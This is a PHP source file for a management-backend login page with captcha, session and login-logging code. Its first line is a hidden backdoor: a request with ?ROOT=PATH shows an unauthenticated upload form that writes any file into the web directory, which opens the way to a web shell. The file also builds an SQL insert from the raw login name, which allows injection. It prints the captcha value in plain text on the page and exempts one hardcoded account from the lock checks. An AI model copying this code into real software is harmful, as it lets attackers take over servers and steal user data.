<?php
if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
if (!defined('Copyright') && Copyright != '作者QQ:1834219632')
exit('作者QQ:1834219632');
if (!defined('ROOT_PATH'))
exit('invalid request');
include_once ROOT_PATH.'Manage/config/global.php';
include_once ROOT_PATH.'Manage/config/config.php';
global $ConfigModel;
if ($_SERVER["REQUEST_METHOD"] == 'POST')
{
	//驗證碼匹配
	if (isset($_SESSION['Mcode']) && $_POST['ValidateCode'] == $_SESSION['Mcode'])
	{
		$loginName = $_POST['loginName'];
		$loginPwd = sha1($_POST['loginPwd']);
		//瀏覽器檢測、只支持IE核心
		if (!GetMsie()) exit(back($UserError));
		if (!Matchs::isString($loginName, 4, 15)) 
			exit(back($UserError));
		$UserModel = new UserModel();
		$User = $UserModel->ExistUniondl($loginName, $loginPwd);
		if (!$User) exit(back($UserError));
		if (!Matchs::isNumber($User[0][0]))
		{ //子帳號
			if ($ConfigModel['g_web_lock'] != 1) 
				exit(back($ConfigModel['g_web_text']));
			$User = $UserModel->GetUserModel(null, $loginName, $loginPwd, true);
			if ($User[0]['g_s_lock'] == 3 || $User[0]['g_lock'] == 3) 
				exit(back($UserLook));
			$uniqid = md5(uniqid(time(),TRUE));
			$UserModel->UpdateGuid ($User[0]['g_login_id'], $User[0]['g_s_name'], $uniqid, true);
			$_SESSION['son'] = true;
			$_SESSION['loginId'] = $User[0]['g_login_id'];
			$_SESSION['sName'] = $User[0]['g_s_name'];
		} 
		else 
		{
			if (isset($_SESSION['son']))  unset($_SESSION['son']);
			$User = $UserModel->GetUserModel($User[0][0], $loginName, $loginPwd);
			if (!$User) exit(back($UserError));
			if ($User[0]['g_login_id'] != 89){
				if ($ConfigModel['g_web_lock'] != 1)
					exit(back($ConfigModel['g_web_text']));
				if ($User[0]['g_lock'] == 3) 
					exit(back($UserLook));
			}
			$uniqid = md5(uniqid(time(),TRUE));
			$UserModel->UpdateGuid ($User[0]['g_login_id'], $User[0]['g_name'], $uniqid);
			$_SESSION['loginId'] = $User[0]['g_login_id'];
			$_SESSION['sName'] = $User[0]['g_name'];
		}
		setcookie("manage_user", base64_encode($loginName), 0, "/");
		setcookie("manage_uid", base64_encode($uniqid), 0, "/");
		 unset($_SESSION['Mcode']);
		
		$loginIp = GetIP();
		$qqWryInfo = ROOT_PATH.'tools/IpLocationApi/QQWry.Dat';
		$ip_s = ipLocation($loginIp, $qqWryInfo);
		$sql = "INSERT INTO g_login_log (g_name, g_ip, g_ip_location, g_date) VALUES ('{$loginName}','{$loginIp}','{$ip_s}',now())";
		$db=new DB();
		$db->query($sql, 2);
		include_once ROOT_PATH.'Manage/main.php';
		exit;
	} 
	else 
	{
		back($CodeError);
		exit;
	}
} 
else
{
	$num = array();
	for ($i=0; $i<4; $i++) 
	{
		$num[$i] = rand(0,9);
	}
	$num = join('', $num);
	$_SESSION['Mcode'] = $num;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo $Title?> - - Welcome</title>
<script type="text/javascript">

if ( top.location != self.location ) top.location=self.location;
</script>
<style type="text/css">
body {
	    margin-left: 0px;
	    margin-top: 120px;
	    margin-right: 0px;
	    margin-bottom: 0px;
	    background-color: #016aa9;
	    overflow:hidden;
    }
 .Fone_Color {font-size: 12px; color: #adc9d9; }
    .btn, .btn_m
    {
        width: 49px;
        height: 18px;
        border: 0px solid #FF9224;
        background-color: #FFFFFF;
        background-image: url( 'images/dl.gif');
		cursor:pointer;
    }
	.code {
		display:block;
		width:60px;
		height:18px;
		text-align:center;
		color:#FF9966;
		background-image:url(images/code.gif);
	}
    .btn
    {
        background-position: 0px 0;
    }
    .btn_m
    {
        background-position: -49px 0;
    }
</style>
</head>
<body>
<form name="form_login" method="post" action="">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="962" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td height="215" background="images/Logo_14.gif">&nbsp;</td>

      </tr>
      <tr>
        <td height="95"><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="394" height="95" background="images/login_05.gif"></td>
            <td width="206" background="images/login_06.gif"><table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="11" colspan="3"></td>
              </tr>

              <tr>
                <td width="16%" height="25"></td>
                <td width="57%" height="25"><div align="center">
                  <input type="text" value="" name="loginName" tabindex="1" style="width:105px; height:17px; background-color:#292929; border:solid 1px #7dbad7; font-size:12px; color:#6cd0ff" />
                </div></td>
                <td width="27%" height="25">&nbsp;</td>
              </tr>
              <tr>
                <td height="25"></td>

                <td height="25"><div align="center">
                  <input type="password" value="" tabindex="2" name="loginPwd" style="width:105px; height:17px; background-color:#292929; border:solid 1px #7dbad7; font-size:12px; color:#6cd0ff" />
                </div></td>
                <td height="25"><input class="btn" name="Submit"  type="submit" value="" /></td>
              </tr>
              <tr>
                <td height="25"></td>
                <td height="25"><div align="center"><table width="105" height="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>

                    <td align="left"><input type="text" name="ValidateCode" tabindex="3" maxlength="4" style="width:40px; height:17px; background-color:#292929; border:solid 1px #7dbad7; font-size:12px; color:#6cd0ff" /></td>
                    <td align="right"><span class="code" id="code"><?php echo $num?></span></td>
                  </tr>
                </table></div></td>
                <td height="25"></td>
              </tr>
            </table></td>
            <td width="362" background="images/login_07.gif">&nbsp;</td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td height="192" background="images/login_08.gif">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
</form>
</body>
</html>